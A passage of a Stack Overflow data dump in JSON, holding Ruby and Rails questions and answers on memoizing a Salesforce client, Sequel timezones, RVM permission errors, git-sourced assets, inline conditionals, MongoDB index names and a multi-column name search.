93, "profile_image": "https://www.gravatar.com/avatar/3eb082f2910fcc8ebc7bb2f5ce5bc9ce?s=128&d=identicon&r=PG", "display_name": "Daniel", "link": "https://stackoverflow.com/users/2995613/daniel"}, "edited": false, "score": 2, "creation_date": 1558510556, "post_id": 56248920, "comment_id": 99120578, "body": "@Daniel why do you think it&#39;s not threadsafe? Can it not handle multiple requests simultaneously? That being said, you can use a mutex to synchronize your threads ... see <a href=\"https://ruby-doc.org/core-2.5.0/Mutex.html\" rel=\"nofollow noreferrer\">Mutex</a>"}], "tags": [], "owner": {"reputation": 4690, "user_id": 1937435, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YyN37.jpg?s=128&g=1", "display_name": "Josh Brody", "link": "https://stackoverflow.com/users/1937435/josh-brody"}, "is_accepted": true, "score": 1, "last_activity_date": 1558495751, "creation_date": 1558495751, "answer_id": 56248920, "question_id": 56248132, "link": "https://stackoverflow.com/questions/56248132/keep-a-connection-to-a-third-party-service-open-across-requests/56248920#56248920", "title": "Keep a connection to a third party service open across requests", "body": "<p>You'd want to refactor using one of the many configuration patterns which memoizes the instance. But you can take a quick-and-dirty workaround:</p>\n\n<p><code>config/application.rb</code>:</p>\n\n<pre><code>module DanielApp\n  class Application &lt; Rails::Application\n\n    def salesforce_client\n      @salesforce_client ||= Restforce.new(host: 'test.salesforce.com')\n    end \n  end\nend \n</code></pre>\n\n<p>then,</p>\n\n<pre><code>Rails.application.salesforce_client.query(\"select Id, Something__c from Account where Id = 'someid'\")\n</code></pre>\n\n<p>Or you could define some sort of global in an initializer and then call it from there.</p>\n"}], "owner": {"reputation": 2510, "user_id": 2995613, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/3eb082f2910fcc8ebc7bb2f5ce5bc9ce?s=128&d=identicon&r=PG", "display_name": "Daniel", "link": "https://stackoverflow.com/users/2995613/daniel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 55, "favorite_count": 0, "accepted_answer_id": 56248920, "answer_count": 1, "score": 1, "last_activity_date": 1558495751, "creation_date": 1558487997, "question_id": 56248132, "link": "https://stackoverflow.com/questions/56248132/keep-a-connection-to-a-third-party-service-open-across-requests", "title": "Keep a connection to a third party service open across requests", "body": "<p>I have this module that works as an adaptor for a 3rd party service:</p>\n\n<pre><code>module Salesforce\n  class ConnectionService\n    class &lt;&lt; self\n      def client\n        @client ||= Restforce.new(\n          # Connection Params\n        )\n      end \n\n      delegate :query, :create!, :update!, :upsert!, to: :client\n    end\n  end\nend\n</code></pre>\n\n<p>The idea is to call it as:</p>\n\n<pre><code>Salesforce::ConnectionService.query('select things from remote service')\n</code></pre>\n\n<p>My goal is that, because establishing the connection takes some time, I would like to be able to memoize it to recycle it across requests.</p>\n\n<p>The problem is that having instance variables in class methods seems not to be thread-safe. So I would like to know what would be the proper way to do it.</p>\n\n<p>Note: I know that for now, I am not taking into account the case when the connection closes, I will deal with it later.</p>\n"}, {"tags": ["ruby", "sequel"], "comments": [{"owner": {"reputation": 5292, "user_id": 2727267, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0e7c773908a4f6095f63cb9553bbc7af?s=128&d=identicon&r=PG", "display_name": "Beartech", "link": "https://stackoverflow.com/users/2727267/beartech"}, "edited": false, "score": 1, "creation_date": 1558496772, "post_id": 56247930, "comment_id": 99115895, "body": "Is there a reason you don&#39;t want to store the user&#39;s preferred time zone and just display the information in their time zone?"}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 11536641, "user_type": "registered", "profile_image": "https://graph.facebook.com/2295126217174996/picture?type=large", "display_name": "Vhilly Santiago", "link": "https://stackoverflow.com/users/11536641/vhilly-santiago"}, "edited": false, "score": 0, "creation_date": 1558569452, "post_id": 56251158, "comment_id": 99148887, "body": "Yep we are storing everything in UTC and converting in ui is not a problem. My problem is in our application we let the user to input sql query in the textbox and run it. We dont want to hussle the user in doing date conversion in each they make for example in where clause where they will enter date in no timezone format"}], "tags": [], "owner": {"reputation": 7224, "user_id": 448934, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TXtux.jpg?s=128&g=1", "display_name": "Pascal", "link": "https://stackoverflow.com/users/448934/pascal"}, "is_accepted": false, "score": 0, "last_activity_date": 1558508987, "creation_date": 1558508987, "answer_id": 56251158, "question_id": 56247930, "link": "https://stackoverflow.com/questions/56247930/how-to-convert-output-timezone-per-query-in-sequel-ruby/56251158#56251158", "title": "How to convert output timezone per query in sequel ruby?", "body": "<p>Store everything in UTC and then convert in the UI/presentation layer.</p>\n"}, {"comments": [{"owner": {"reputation": 13, "user_id": 11536641, "user_type": "registered", "profile_image": "https://graph.facebook.com/2295126217174996/picture?type=large", "display_name": "Vhilly Santiago", "link": "https://stackoverflow.com/users/11536641/vhilly-santiago"}, "edited": false, "score": 0, "creation_date": 1558570069, "post_id": 56260071, "comment_id": 99149026, "body": "btw is it ok to create thread per logged in user performance wise?"}, {"owner": {"reputation": 11331, "user_id": 132053, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f183bcc4176b308c9edabe79299e448f?s=128&d=identicon&r=PG", "display_name": "Jeremy Evans", "link": "https://stackoverflow.com/users/132053/jeremy-evans"}, "reply_to_user": {"reputation": 13, "user_id": 11536641, "user_type": "registered", "profile_image": "https://graph.facebook.com/2295126217174996/picture?type=large", "display_name": "Vhilly Santiago", "link": "https://stackoverflow.com/users/11536641/vhilly-santiago"}, "edited": false, "score": 0, "creation_date": 1558624984, "post_id": 56260071, "comment_id": 99171084, "body": "Probably not a good idea.  I think most people would just define a method that yields and has an ensure clause to set the thread local timezone back to nil.  Then you would call that method around whatever code you wanted in the user-specific timezone."}], "tags": [], "owner": {"reputation": 11331, "user_id": 132053, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f183bcc4176b308c9edabe79299e448f?s=128&d=identicon&r=PG", "display_name": "Jeremy Evans", "link": "https://stackoverflow.com/users/132053/jeremy-evans"}, "is_accepted": true, "score": 0, "last_activity_date": 1558538171, "creation_date": 1558538171, "answer_id": 56260071, "question_id": 56247930, "link": "https://stackoverflow.com/questions/56247930/how-to-convert-output-timezone-per-query-in-sequel-ruby/56260071#56260071", "title": "How to convert output timezone per query in sequel ruby?", "body": "<p>You probably want to use Sequel's thread_local_timezones extension: <a href=\"http://sequel.jeremyevans.net/rdoc-plugins/files/lib/sequel/extensions/thread_local_timezones_rb.html\" rel=\"nofollow noreferrer\">http://sequel.jeremyevans.net/rdoc-plugins/files/lib/sequel/extensions/thread_local_timezones_rb.html</a></p>\n\n<p>This is per thread, not per query, but should hopefully still work for your needs.</p>\n"}], "owner": {"reputation": 13, "user_id": 11536641, "user_type": "registered", "profile_image": "https://graph.facebook.com/2295126217174996/picture?type=large", "display_name": "Vhilly Santiago", "link": "https://stackoverflow.com/users/11536641/vhilly-santiago"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 98, "favorite_count": 0, "accepted_answer_id": 56260071, "answer_count": 2, "score": 0, "last_activity_date": 1558538171, "creation_date": 1558485785, "question_id": 56247930, "link": "https://stackoverflow.com/questions/56247930/how-to-convert-output-timezone-per-query-in-sequel-ruby", "title": "How to convert output timezone per query in sequel ruby?", "body": "<p>I wanted to be able to set timezone in each query depending on my user's preferred timezone without adding timezone conversion in each raw sql generated by my application.</p>\n\n<p>I was able to query/retrieve the records in 'Asia/Manila' TZ using this config</p>\n\n<p>Sequel.extension :named_timezones\nSequel.application_timezone = 'Asia/Manila'</p>\n\n<p>Is it possible to set application_timezone per query so that I will pass the current application user's timezone in each request.</p>\n"}, {"tags": ["ruby", "rvm"], "answers": [{"comments": [{"owner": {"reputation": 86, "user_id": 4180908, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/1842f4a802c597380bc979f8f6541b54?s=128&d=identicon&r=PG&f=1", "display_name": "Hari Shankar", "link": "https://stackoverflow.com/users/4180908/hari-shankar"}, "edited": false, "score": 1, "creation_date": 1561480121, "post_id": 56247821, "comment_id": 100074275, "body": "<code>sudo chown -R CURRENT-USER:rvm &#47;usr&#47;share&#47;rvm&#47;*</code>  Can get the <code>CURRENT-USER</code> using <code>whoami</code>"}, {"owner": {"reputation": 83, "user_id": 7250020, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xxVIhgz6CoM/AAAAAAAAAAI/AAAAAAAAABA/ktY645ocetI/photo.jpg?sz=128", "display_name": "Kacper Cichecki", "link": "https://stackoverflow.com/users/7250020/kacper-cichecki"}, "edited": false, "score": 0, "creation_date": 1609248211, "post_id": 56247821, "comment_id": 115788434, "body": "you should rather add user to required <code>rvm</code> group instead of changing ownership of files"}], "tags": [], "owner": {"reputation": 1879, "user_id": 6815472, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/BYqXH.png?s=128&g=1", "display_name": "Goms", "link": "https://stackoverflow.com/users/6815472/goms"}, "is_accepted": true, "score": 11, "last_activity_date": 1608497219, "last_edit_date": 1608497219, "creation_date": 1558484561, "answer_id": 56247821, "question_id": 56247697, "link": "https://stackoverflow.com/questions/56247697/rvm-failed-to-create-the-file-bin-ruby-2-6-3-tar-bz2-part-permission-denied/56247821#56247821", "title": "rvm : Failed to create the file bin-ruby-2.6.3.tar.bz2.part: Permission denied", "body": "<p>I've successfully resolved the problem by running:</p>\n<p><code>sudo chown -R goms:rvm /usr/share/rvm/*</code></p>\n<p>Where <code>goms</code>is the current user.</p>\n"}, {"tags": [], "owner": {"reputation": 83, "user_id": 7250020, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xxVIhgz6CoM/AAAAAAAAAAI/AAAAAAAAABA/ktY645ocetI/photo.jpg?sz=128", "display_name": "Kacper Cichecki", "link": "https://stackoverflow.com/users/7250020/kacper-cichecki"}, "is_accepted": false, "score": 0, "last_activity_date": 1609248122, "creation_date": 1609248122, "answer_id": 65492834, "question_id": 56247697, "link": "https://stackoverflow.com/questions/56247697/rvm-failed-to-create-the-file-bin-ruby-2-6-3-tar-bz2-part-permission-denied/65492834#65492834", "title": "rvm : Failed to create the file bin-ruby-2.6.3.tar.bz2.part: Permission denied", "body": "<p>From RVM installation manual:\n<a href=\"https://github.com/rvm/ubuntu_rvm\" rel=\"nofollow noreferrer\">https://github.com/rvm/ubuntu_rvm</a>\n&quot;all sudoers are automatic added to rvm group at install&quot; - please make sure that you are in rvm group. You can verify this using <code>groups</code> command.</p>\n<p>If you're not, you can add your user to required group with this command:\n<code>sudo usermod -aG rvm $USER</code>\nThen you have to reboot your system.</p>\n"}], "owner": {"reputation": 1879, "user_id": 6815472, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/BYqXH.png?s=128&g=1", "display_name": "Goms", "link": "https://stackoverflow.com/users/6815472/goms"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 797, "favorite_count": 1, "accepted_answer_id": 56247821, "answer_count": 2, "score": 3, "last_activity_date": 1609248122, "creation_date": 1558483198, "question_id": 56247697, "link": "https://stackoverflow.com/questions/56247697/rvm-failed-to-create-the-file-bin-ruby-2-6-3-tar-bz2-part-permission-denied", "title": "rvm : Failed to create the file bin-ruby-2.6.3.tar.bz2.part: Permission denied", "body": "<p>I'm trying to install unsuccessfully ruby from rvm</p>\n\n<pre><code>rvm install ruby\n</code></pre>\n\n<p>And I have this result</p>\n\n<blockquote>\n  <p>Failed to create the file bin-ruby-2.6.3.tar.bz2.part: Permission\n  denied</p>\n</blockquote>\n\n<p>Did you have an idea about this problem ?</p>\n"}, {"tags": ["javascript", "ruby-on-rails", "ruby", "stylesheet", "assets"], "comments": [{"owner": {"reputation": 3705, "user_id": 8551976, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oxgdN.jpg?s=128&g=1", "display_name": "asimhashmi", "link": "https://stackoverflow.com/users/8551976/asimhashmi"}, "edited": false, "score": 0, "creation_date": 1558470616, "post_id": 56245905, "comment_id": 99110294, "body": "So you have this repository that you want to download and add its css and js files to your rails project?"}, {"owner": {"reputation": 1123, "user_id": 5233175, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/F4N6y.jpg?s=128&g=1", "display_name": "Paul W&#252;rtz", "link": "https://stackoverflow.com/users/5233175/paul-w%c3%bcrtz"}, "reply_to_user": {"reputation": 3705, "user_id": 8551976, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oxgdN.jpg?s=128&g=1", "display_name": "asimhashmi", "link": "https://stackoverflow.com/users/8551976/asimhashmi"}, "edited": false, "score": 0, "creation_date": 1558470967, "post_id": 56245905, "comment_id": 99110425, "body": "Rigth, but preferably just by adding the repo link and let rails do the downloading :) Just as you you would add a dependency in your <code>package.json</code> in npm with <code>&quot;package-name&quot;: &quot;git+https:&#47;&#47;repo.url&#47;link.git&quot;,</code> :)"}, {"owner": {"reputation": 3705, "user_id": 8551976, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oxgdN.jpg?s=128&g=1", "display_name": "asimhashmi", "link": "https://stackoverflow.com/users/8551976/asimhashmi"}, "edited": false, "score": 0, "creation_date": 1558472934, "post_id": 56245905, "comment_id": 99111218, "body": "Well if your repo doesn&#39;t contain a valid Gem or npm package. then I don&#39;t think that  you will be able to add it through your repo link, you will have to download the assets and add them locally (css and js files)"}, {"owner": {"reputation": 1123, "user_id": 5233175, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/F4N6y.jpg?s=128&g=1", "display_name": "Paul W&#252;rtz", "link": "https://stackoverflow.com/users/5233175/paul-w%c3%bcrtz"}, "reply_to_user": {"reputation": 3705, "user_id": 8551976, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oxgdN.jpg?s=128&g=1", "display_name": "asimhashmi", "link": "https://stackoverflow.com/users/8551976/asimhashmi"}, "edited": false, "score": 0, "creation_date": 1558473887, "post_id": 56245905, "comment_id": 99111567, "body": "So how do I it with a npm package if you mentioned it :)"}, {"owner": {"reputation": 1123, "user_id": 5233175, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/F4N6y.jpg?s=128&g=1", "display_name": "Paul W&#252;rtz", "link": "https://stackoverflow.com/users/5233175/paul-w%c3%bcrtz"}, "reply_to_user": {"reputation": 3705, "user_id": 8551976, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oxgdN.jpg?s=128&g=1", "display_name": "asimhashmi", "link": "https://stackoverflow.com/users/8551976/asimhashmi"}, "edited": false, "score": 0, "creation_date": 1558476467, "post_id": 56245905, "comment_id": 99112295, "body": "Because yes, my project is a npm package :)"}], "answers": [{"tags": [], "owner": {"reputation": 1123, "user_id": 5233175, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/F4N6y.jpg?s=128&g=1", "display_name": "Paul W&#252;rtz", "link": "https://stackoverflow.com/users/5233175/paul-w%c3%bcrtz"}, "is_accepted": true, "score": 0, "last_activity_date": 1559210871, "creation_date": 1559210871, "answer_id": 56376077, "question_id": 56245905, "link": "https://stackoverflow.com/questions/56245905/how-to-add-a-frontend-asset-from-a-git-repo-npm-project-to-a-rails-project/56376077#56376077", "title": "How to add a frontend asset from a git repo/npm project to a rails project", "body": "<p>I managed to add just a <code>.gemspec</code> to my <code>npm</code> repo, move my <code>js</code> and <code>css</code> to the <code>vendor/assets</code> folder, all in a dedicated \"gemfile branch\"</p>\n\n<pre><code>Gem::Specification.new do |s|\n  s.name        = 'asset-name'\n  s.version     = '0.0.0'\n  s.date        = '2020-05-30'\n  s.summary     = \"What my package does.\"\n  s.description = \"\"\n  s.files       = [\n        \"vendor/assets/javascripts/app.min.js\",\n        \"vendor/assets/stylesheets/app.css\"\n  ]\n  s.license       = 'MIT'\nend\n</code></pre>\n\n<p>and then added the repo with it<code>s branch to the rail projects</code>Gemfile` like this:</p>\n\n<p><code>gem \"asset-name\", :git =&gt; \"git://github.com/user/repo.git\", :branch =&gt; \"ruby-gem\"</code></p>\n"}], "owner": {"reputation": 1123, "user_id": 5233175, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/F4N6y.jpg?s=128&g=1", "display_name": "Paul W&#252;rtz", "link": "https://stackoverflow.com/users/5233175/paul-w%c3%bcrtz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 165, "favorite_count": 0, "accepted_answer_id": 56376077, "answer_count": 1, "score": 0, "last_activity_date": 1559210871, "creation_date": 1558470484, "last_edit_date": 1558636855, "question_id": 56245905, "link": "https://stackoverflow.com/questions/56245905/how-to-add-a-frontend-asset-from-a-git-repo-npm-project-to-a-rails-project", "title": "How to add a frontend asset from a git repo/npm project to a rails project", "body": "<p>I want to contribute to an open source project written in <code>rails</code> with some frontend web stuff, that depends on an asset, which I have on an external <code>git</code> repository. So I would like to add the asset dependency from the <code>git</code> link and just add my code to the frontend.</p>\n\n<p>I do not know much about <code>rails</code>, especially asset managements, but that the <code>css</code> and <code>js</code> files are all in the manifest files, and come seemingly from some ruby gems, which include the <code>css</code> and <code>js</code> assets then. </p>\n\n<p>So is there a good way to add an asset to my rails manifest file/assets without having it as a ruby gem, just from a git repo?</p>\n\n<p>Thank you so much for help and pardon my rails illiteracy :S</p>\n"}, {"tags": ["ruby", "if-statement"], "comments": [{"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 1, "creation_date": 1558468823, "post_id": 56245528, "comment_id": 99109555, "body": "You want a quaternary operator? ;-)"}, {"owner": {"reputation": 302, "user_id": 4588188, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/pytwu.jpg?s=128&g=1", "display_name": "AJwr", "link": "https://stackoverflow.com/users/4588188/ajwr"}, "edited": false, "score": 0, "creation_date": 1558468877, "post_id": 56245528, "comment_id": 99109586, "body": "<a href=\"https://stackoverflow.com/questions/15478357/ruby-ternary-operator-and-elsif\">this post</a> might be of help"}, {"owner": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "edited": false, "score": 0, "creation_date": 1558470568, "post_id": 56245528, "comment_id": 99110276, "body": "What do you mean by &quot;declare&quot;? You don&#39;t need to declare anything to use a conditional expression in Ruby, you can just use it. What do you mean by &quot;<code>if elsif</code>statement&quot;? There are no statements in Ruby, only expressions. What do you mean by &quot;inline&quot;? Ruby doesn&#39;t have a concept of &quot;inlining&quot; in the language (although many Ruby compilers will of course perform inlining as an optimization). Also, inlining only applies to method calls."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 1, "creation_date": 1558471909, "post_id": 56245528, "comment_id": 99110795, "body": "Why the rush to select an answer? You don&#39;t want to see others?"}], "answers": [{"tags": [], "owner": {"reputation": 23016, "user_id": 2981429, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/ZcCXx.jpg?s=128&g=1", "display_name": "max pleaner", "link": "https://stackoverflow.com/users/2981429/max-pleaner"}, "is_accepted": false, "score": 3, "last_activity_date": 1558470904, "last_edit_date": 1558470904, "creation_date": 1558468996, "answer_id": 56245607, "question_id": 56245528, "link": "https://stackoverflow.com/questions/56245528/syntax-of-if-elsif-inline-statement-with-ruby/56245607#56245607", "title": "syntax of if/elsif inline statement with ruby", "body": "<p>Yes, you can do it two ways:</p>\n\n<ol>\n<li><p>with semicolons</p>\n\n<pre><code>if x == 2; \"Equal\"; elsif x &gt; 2; \"Greater\"; else; \"Lower\"; end\n</code></pre></li>\n<li><p>with <code>then</code>:</p>\n\n<pre><code>if x == 2 then \"Equal\" elsif x &gt; 2 then \"Greater\" else \"Lower\" end\n</code></pre></li>\n</ol>\n\n<p>Also keep in mind that <code>if/unless</code> are expressions with a return value, for example:</p>\n\n<pre><code>val = if x == 2 then \"Equal\"\n      elsif x &gt; 2 then \"Greater\"\n      else \"Lower\"\n      end\n</code></pre>\n\n<p>or</p>\n\n<pre><code>puts(if x == 2 then \"Equal\"\n  elsif x &gt; 2 then \"Greater\"\n  else \"Lower\" end\n)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "is_accepted": true, "score": 2, "last_activity_date": 1558469020, "creation_date": 1558469020, "answer_id": 56245611, "question_id": 56245528, "link": "https://stackoverflow.com/questions/56245528/syntax-of-if-elsif-inline-statement-with-ruby/56245611#56245611", "title": "syntax of if/elsif inline statement with ruby", "body": "<p>Sure, you can write </p>\n\n<pre><code>x == 2 ? \"Equal\" : x &gt; 2 ? \"Greater\" : \"Lower\"\n</code></pre>\n\n<p>But I would recommend against writing such lines because IMO they are hard to read and to understand.</p>\n"}, {"tags": [], "owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "is_accepted": false, "score": 3, "last_activity_date": 1558502689, "last_edit_date": 1558502689, "creation_date": 1558472104, "answer_id": 56246240, "question_id": 56245528, "link": "https://stackoverflow.com/questions/56245528/syntax-of-if-elsif-inline-statement-with-ruby/56246240#56246240", "title": "syntax of if/elsif inline statement with ruby", "body": "<p>Three more ways:</p>\n\n<pre><code>(x == 2 &amp;&amp; \"Equal\") || (x &gt; 2 &amp;&amp; \"Greater\") || \"Lower\"\n</code></pre>\n\n<h1><p></p></h1>\n\n<pre><code>case x &lt;=&gt; 2 when -1 then \"Lower\" when 0 then \"Equal\" else \"Greater\" end\n</code></pre>\n\n<h1><p></p></h1>\n\n<pre><code>[\"Equal\", \"Greater\", \"Lower\" ][x &lt;=&gt; 2]\n</code></pre>\n"}], "owner": {"reputation": 142, "user_id": 8054517, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/848ee01262b117e3a352ce835227192d?s=128&d=identicon&r=PG&f=1", "display_name": "Joaquin Diaz", "link": "https://stackoverflow.com/users/8054517/joaquin-diaz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 68, "favorite_count": 0, "accepted_answer_id": 56245611, "answer_count": 3, "score": 0, "last_activity_date": 1558502689, "creation_date": 1558468537, "question_id": 56245528, "link": "https://stackoverflow.com/questions/56245528/syntax-of-if-elsif-inline-statement-with-ruby", "title": "syntax of if/elsif inline statement with ruby", "body": "<p>Is posible declare an <code>if elsif</code> statement inline?</p>\n\n<p>Like <code>x &gt; 2 ? \"Greater\" : \"Equal or lower\"</code></p>\n\n<pre><code>if x == 2 \n  puts \"Equal\"\nelsif x &gt; 2 \n  puts \"Greater\"\nelse\n  puts \"Lower\"\n</code></pre>\n"}, {"tags": ["ruby", "mongodb", "indexing"], "answers": [{"tags": [], "owner": {"reputation": 1306, "user_id": 8008340, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/15JhO.jpg?s=128&g=1", "display_name": "Konstantin Strukov", "link": "https://stackoverflow.com/users/8008340/konstantin-strukov"}, "is_accepted": true, "score": 0, "last_activity_date": 1558471346, "creation_date": 1558471346, "answer_id": 56246072, "question_id": 56244927, "link": "https://stackoverflow.com/questions/56244927/set-index-name-when-creating-it-with-the-mongodb-ruby-driver/56246072#56246072", "title": "Set index name when creating it with the MongoDB Ruby Driver?", "body": "<p>Looking at this line <a href=\"https://github.com/mongodb/mongo-ruby-driver/blob/master/lib/mongo/index/view.rb#L281\" rel=\"nofollow noreferrer\">https://github.com/mongodb/mongo-ruby-driver/blob/master/lib/mongo/index/view.rb#L281</a> I could assume that your problem is using string keys instead of symbol ones. Try the following instead:</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>@mongo_client[\"orders\"].indexes.create_one(\n  {\n    foo: 1,\n    bar: 1\n  },\n  unique: true,\n  name: \"foobar\"\n)\n\n</code></pre>\n"}], "owner": {"reputation": 34, "user_id": 2226653, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/78cf12ddf9d6ac72738374643c135e14?s=128&d=identicon&r=PG", "display_name": "JohnSmith1976", "link": "https://stackoverflow.com/users/2226653/johnsmith1976"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 34, "favorite_count": 0, "accepted_answer_id": 56246072, "answer_count": 1, "score": 0, "last_activity_date": 1558471346, "creation_date": 1558465556, "question_id": 56244927, "link": "https://stackoverflow.com/questions/56244927/set-index-name-when-creating-it-with-the-mongodb-ruby-driver", "title": "Set index name when creating it with the MongoDB Ruby Driver?", "body": "<p>I'm trying to create an index using the <a href=\"https://github.com/mongodb/mongo-ruby-driver\" rel=\"nofollow noreferrer\">mongo-ruby-driver</a>.</p>\n\n<p>As stated in <a href=\"https://github.com/mongodb/mongo-ruby-driver/blob/master/docs/tutorials/ruby-driver-indexing.txt#L57\" rel=\"nofollow noreferrer\">the docs</a> I can add a <code>name</code> key in the options to override the default name derived from the indexed keys.</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>@mongo_client[\"orders\"].indexes.create_one(\n  {\n    \"foo\" =&gt; 1,\n    \"bar\" =&gt; 1\n  },\n  {\n    \"unique\" =&gt; true,\n    \"name\" =&gt; \"foobar\"\n  }\n)\n</code></pre>\n\n<p>However it seems to be ignored. Any idea what I'm doing wrong?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "filterrific"], "answers": [{"tags": [], "owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "is_accepted": true, "score": 1, "last_activity_date": 1558461690, "creation_date": 1558461690, "answer_id": 56244032, "question_id": 56243700, "link": "https://stackoverflow.com/questions/56243700/seach-two-columns-together-in-a-single-search-column/56244032#56244032", "title": "Seach two columns together in a single search column", "body": "<p><code>AND</code> has higher precedence than <code>OR</code> therefore you have to change where you add parentheses:</p>\n\n<pre><code>where(\n  terms.map { |term|\n    \"(LOWER(users.lastname) LIKE ? OR LOWER(users.firstname) LIKE ? OR LOWER(users.middlename) LIKE ?)\"\n  }.join(' AND '),\n  *terms.map { |e| [e] * num_or_conds }.flatten\n)\n</code></pre>\n"}], "owner": {"reputation": 209, "user_id": 10456876, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/40421f1e126c40b97c8a9378104031e5?s=128&d=identicon&r=PG&f=1", "display_name": "User7777", "link": "https://stackoverflow.com/users/10456876/user7777"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 51, "favorite_count": 0, "accepted_answer_id": 56244032, "answer_count": 1, "score": 0, "last_activity_date": 1558461690, "creation_date": 1558460298, "question_id": 56243700, "link": "https://stackoverflow.com/questions/56243700/seach-two-columns-together-in-a-single-search-column", "title": "Seach two columns together in a single search column", "body": "<p>I am using filterrifc gem in my rails app for adding filters to the index list.I have a users table with firstname, lastname and middlename as the field. What I am trying to do is search through all these column in a single search column. The issue I am facing is:\n When I am search for <strong>Jimmy</strong> then I get a list of all Jimmys in firstname, lastname and middlename. But When I try search for specific <strong>Jimmy Wilson</strong> it doesnt work. It still just shows Jimmys not the specific <strong>Jimmy Wilson</strong>. Please help me find the issue.</p>\n\n<p>user.rb</p>\n\n<pre><code>scope :search_name, lambda { |query|\n    return nil  if query.blank?\n\n    terms = query.downcase.split(/\\s+/)\n\n    terms = terms.map { |e|\n      ('%' + e + '%').gsub(/%+/, '%')\n    }\n\n    num_or_conds = 3\n    where(\n      terms.map { |term|\n        \"(LOWER(users.lastname) LIKE ?) OR (LOWER(users.firstname) LIKE ?) OR (LOWER(users.middlename) LIKE ?)\"\n      }.join(' AND '),\n      *terms.map { |e| [e] * num_or_conds }.flatten\n    )\n  } \n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "sidekiq"], "comments": [{"owner": {"reputation": 1784, "user_id": 435817, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/336ff924a5e2f7efe299b3d1210957e2?s=128&d=identicon&r=PG", "display_name": "patrickdavey", "link": "https://stackoverflow.com/users/435817/patrickdavey"}, "edited": false, "score": 1, "creation_date": 1558459334, "post_id": 56242038, "comment_id": 99105569, "body": "My only suggestion would that the begin, rescue end block where you&#39;re calling <code>CoreDBListModel.connection.close</code> could easily be masking some issue with the closing happening properly. I&#39;d consider at minimum doing some logging there to see if there is an issue there or even just not wrapping it in the rescue (but, it&#39;s prod, maybe you don&#39;t want that)"}, {"owner": {"reputation": 1065, "user_id": 466009, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JKRUO.png?s=128&g=1", "display_name": "chech", "link": "https://stackoverflow.com/users/466009/chech"}, "edited": false, "score": 0, "creation_date": 1609254387, "post_id": 56242038, 